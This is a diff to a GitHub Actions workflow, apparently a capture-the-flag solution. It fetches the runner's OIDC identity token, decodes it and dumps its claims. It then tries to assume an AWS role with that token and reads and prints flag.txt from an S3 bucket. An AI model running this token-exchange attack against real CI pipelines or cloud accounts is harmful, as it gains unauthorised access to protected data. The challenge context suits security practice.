@@ -28,7 +28,7 @@ jobs:
           TOK="${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
           curl -sS -H "Authorization: bearer $TOK" "${URL}&audience=sts.amazonaws.com" > oidc_response.json
           python3 - <<'PY'
-import json,base64,sys,pathlib
+import json,base64,pathlib
 p=pathlib.Path
 data=json.load(open("oidc_response.json"))
 tok=data.get("value","")
@@ -36,13 +36,13 @@ p("idtoken.jwt").write_text(tok)
 def b64d(s): s+="="*(-len(s)%4); return base64.urlsafe_b64decode(s)
 hdr=json.loads(b64d(tok.split(".")[0]))
 pl =json.loads(b64d(tok.split(".")[1]))
-p("payload.json").write_text(json.dumps(pl, indent=2))
+p("payload.json").write_text(json.dumps({"header":hdr,"payload":pl}, indent=2))
 print("sub:", pl.get("sub"))
 print("repository:", pl.get("repository"))
 print("ref:", pl.get("ref"))
 print("aud:", pl.get("aud"))
 PY
-          sed -n '1,120p' payload.json || true
+          sed -n '1,160p' payload.json || true
 
       - name: Try AWS STS AssumeRoleWithWebIdentity (best-effort)
         shell: bash
@@ -62,7 +62,6 @@ PY
         shell: bash
         run: |
           set -euo pipefail
-          # ถ้า sts ไม่สำเร็จ aws env จะว่าง ก็จะ error ได้ — ปล่อยผ่าน
           aws s3 cp s3://oh-i-really-do-care/flag.txt ./real_flag.txt || true
           echo "---- BEGIN FLAG ----"
           sed -n '1,200p' real_flag.txt || true
